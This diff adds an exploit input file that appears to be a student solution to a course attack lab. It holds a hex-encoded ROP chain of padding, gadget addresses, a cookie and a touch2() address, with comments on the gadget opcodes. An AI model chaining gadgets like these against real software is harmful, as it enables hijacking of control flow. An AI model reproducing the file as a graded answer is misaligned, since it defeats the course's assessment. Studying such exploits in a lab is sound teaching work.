@@ -1,0 +1,27 @@
+/*
+允许使用的寄存器: rax rdx rcx rbx rdi rsi rbp rsp
+movq : 0x48 0x89 0x??(0xc0-0xff)
+popq : 0x58-0x5f
+ret : 0xc3
+nop : 0x90
+
+# not used : 48 89 e0 # mov %rsp , %rax ; 0x401aad
+
+58 90 c3 # popq %rax ; 0x4019cc
+48 89 c7 # movq %rax , %rdi ; 0x4019c5
+
+*/
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+00 00 00 00
+cc 19 40 00 00 00 00 00 /* gadget: popq %rax ; ret */
+fa 97 b9 59 00 00 00 00 /* cookie */
+c5 19 40 00 00 00 00 00 /* gadget: movq %rax , %rdi ; ret */
+ec 17 40 00 00 00 00 00 /* touch2() */
